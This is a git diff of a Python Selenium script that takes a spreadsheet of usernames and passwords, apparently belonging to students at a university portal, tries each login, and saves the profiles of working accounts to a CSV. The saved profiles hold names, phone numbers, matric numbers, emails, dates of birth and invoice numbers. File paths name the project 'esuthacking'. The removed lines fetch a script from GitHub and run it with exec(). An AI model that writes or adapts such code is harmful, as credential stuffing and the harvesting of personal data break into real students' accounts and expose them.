@@ -6,10 +6,9 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
-import requests
 
-def login_and_get_profile_info(username, password, chromedriver_path):
-    # Set the path to the chromedriver
+def login_and_get_profile_info(username, password):
+    chromedriver_path = '/opt/homebrew/bin/chromedriver'
     os.environ['PATH'] += os.pathsep + chromedriver_path
 
     options = Options()
@@ -80,7 +79,7 @@ def login_and_get_profile_info(username, password, chromedriver_path):
                 EC.presence_of_element_located((By.ID, 'ddlSession'))
             )
             session_dropdown.click()
-            session_dropdown.find_element(By.XPATH, "//option[@value='26']").click()
+            session_dropdown.find_element(By.XPATH, "//option[@value='26']").click()  # Select 2024-2025
 
             generate_button = driver.find_element(By.ID, 'Button1')
             generate_button.click()
@@ -113,49 +112,43 @@ def login_and_get_profile_info(username, password, chromedriver_path):
     finally:
         driver.quit()
 
-def check_credentials(input_file, output_file, chromedriver_path):
-    accounts_df = pd.read_excel(input_file)
-    valid_accounts_df = pd.DataFrame(columns=[
+def check_credentials(accounts_df, output_file_path):
+    columns = [
         'Username', 'Password', 'Surname', 'Firstname', 'Middlename', 'Phone', 'MatricNumber', 
-        'Department', 'Email', 'DateOfBirth', 'InvoiceNumber'])
-
-    # Open the output file with buffering disabled (line buffered mode)
-    with open(output_file, 'w', newline='', buffering=1) as csvfile:
-        valid_accounts_df.to_csv(csvfile, index=False)  # Write the header initially
+        'Department', 'Email', 'DateOfBirth', 'InvoiceNumber'
+    ]
+    
+    # Open the output file in append mode
+    with open(output_file_path, 'w', newline='', buffering=1) as csvfile:
+        # Create the CSV writer
+        writer = pd.DataFrame(columns=columns)
+        writer.to_csv(csvfile, index=False)  # Write the header initially
 
         for index, row in accounts_df.iterrows():
             username = row['username']
             password = row['password']
 
-            profile_info = login_and_get_profile_info(username, password, chromedriver_path)
+            profile_info = login_and_get_profile_info(username, password)
 
             if profile_info is not None:
+                # Append the valid account's profile info directly to CSV
                 profile_info_df = pd.DataFrame([profile_info])
-                profile_info_df.to_csv(csvfile, header=False, index=False)  # Append data
-                csvfile.flush()  # Flush after each write to force it to disk
-                print(f"Saved profile info for {username}")
+                profile_info_df.to_csv(csvfile, header=False, index=False)
+                csvfile.flush()  # Flush after each write to ensure immediate disk write
+                print(f"Saved valid account: {username}")
 
-    print(f"Results saved to {output_file}")
+    print("Finished processing all accounts.")
 
-def fetch_and_run_github_script():
-    input_file = "/path/to/input_file.xlsx"
-    output_file = "/path/to/output_file.csv"
-    chromedriver_path = "/opt/homebrew/bin/chromedriver"
-    
-    github_raw_url = "https://raw.githubusercontent.com/CyberPlugNG/esuthack/main/esuthackscript.py"
-    response = requests.get(github_raw_url)
+# Specify the full path to your Excel file
+excel_file_path = '/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2022 ENG.xlsx'
 
-    if response.status_code == 200:
-        script_content = response.text
-        exec_globals = {
-            "__name__": "__main__",
-            "input_file": input_file,
-            "output_file": output_file,
-            "chromedriver_path": chromedriver_path,
-        }
-        exec(script_content, exec_globals)
-    else:
-        print(f"Failed to fetch the script: {response.status_code} - {response.reason}")
+# Load the accounts from the Excel file
+accounts_df = pd.read_excel(excel_file_path)
 
-if __name__ == "__main__":
-    fetch_and_run_github_script()
+# Specify the path where you want to save the valid accounts data as CSV
+output_file_path = '/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2022.csv'
+
+# Check credentials and get valid accounts, saving each one immediately
+check_credentials(accounts_df, output_file_path)
+
+print("Finished processing all accounts.")
